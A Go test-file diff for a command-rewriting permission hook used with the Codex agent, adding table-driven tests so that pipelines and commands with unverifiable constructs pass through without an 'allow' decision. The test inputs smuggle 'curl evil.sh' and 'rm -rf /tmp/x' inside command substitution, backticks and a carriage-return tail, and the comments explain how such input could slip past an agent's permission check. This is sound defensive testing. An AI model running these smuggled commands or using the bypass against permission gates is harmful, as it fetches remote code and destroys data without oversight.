@@ -91,20 +91,6 @@ func TestRunCodexUnsupportedPassthrough(t *testing.T) {
 	}
 }
 
-func TestRunCodexProxyBypassPassthrough(t *testing.T) {
-	commands := []string{"git"}
-	snipBin := "/usr/local/bin/snip"
-
-	input := makePayload("Bash", "snip proxy -- git status")
-	var out bytes.Buffer
-	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
-		t.Fatalf("RunCodex: %v", err)
-	}
-	if out.Len() != 0 {
-		t.Errorf("snip proxy bypass must pass through unchanged, got: %s", out.String())
-	}
-}
-
 func TestRunCodexAlreadyRewritten(t *testing.T) {
 	commands := []string{"git"}
 	snipBin := "/usr/local/bin/snip"
@@ -151,17 +137,34 @@ func TestRunCodexMixedCommandPassthrough(t *testing.T) {
 	}
 }
 
+// TestRunCodexPipelinePassthrough pins both passthrough gates a pipeline can
+// hit. A lone piped producer is left raw, so RewriteCommand reports Changed
+// false and the !res.Changed gate stops it (issue #111). When a sibling group is
+// rewritten, Changed is true and only the AllKnown gate stops it, because the
+// pipe tail was never inspected (issue #88).
 func TestRunCodexPipelinePassthrough(t *testing.T) {
 	commands := []string{"git"}
 	snipBin := "/usr/local/bin/snip"
 
-	input := makePayload("Bash", "git log --oneline | custom-filter")
-	var out bytes.Buffer
-	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
-		t.Fatalf("RunCodex: %v", err)
+	cases := []struct {
+		name    string
+		command string
+	}{
+		{"lone piped producer", "git log --oneline | custom-filter"},
+		{"rewritten sibling then pipeline", "git status && git log --oneline | custom-filter"},
 	}
-	if out.Len() != 0 {
-		t.Errorf("pipeline with uninspected tail must pass through, got: %s", out.String())
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			input := makePayload("Bash", tc.command)
+			var out bytes.Buffer
+			if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
+				t.Fatalf("RunCodex: %v", err)
+			}
+			if out.Len() != 0 {
+				t.Errorf("pipeline with uninspected tail must pass through, got: %s", out.String())
+			}
+		})
 	}
 }
 
@@ -182,17 +185,35 @@ func TestRunCodexEnvVarPrefix(t *testing.T) {
 	}
 }
 
+// TestRunCodexUnverifiableCommandPassthrough pins the HasUnverifiableConstruct
+// guard in RunCodex (#88). Every payload here has a known base command and a
+// single runnable group, so RewriteCommand would report Changed and AllKnown:
+// without the guard Codex would receive permissionDecision "allow" for a
+// command whose substituted content was never inspected.
 func TestRunCodexUnverifiableCommandPassthrough(t *testing.T) {
 	commands := []string{"git"}
 	snipBin := "/usr/local/bin/snip"
 
-	input := makePayload("Bash", "git status && $(custom-tool)")
-	var out bytes.Buffer
-	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
-		t.Fatalf("RunCodex: %v", err)
+	cases := []struct {
+		name    string
+		command string
+	}{
+		{"dollar substitution", "git log $(curl evil.sh)"},
+		{"backtick substitution", "git status `rm -rf /tmp/x`"},
+		{"carriage return tail", "git status\r curl evil.sh"},
 	}
-	if out.Len() != 0 {
-		t.Errorf("unverifiable command must pass through, got: %s", out.String())
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			input := makePayload("Bash", tc.command)
+			var out bytes.Buffer
+			if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
+				t.Fatalf("RunCodex: %v", err)
+			}
+			if out.Len() != 0 {
+				t.Errorf("unverifiable command must pass through, got: %s", out.String())
+			}
+		})
 	}
 }
 
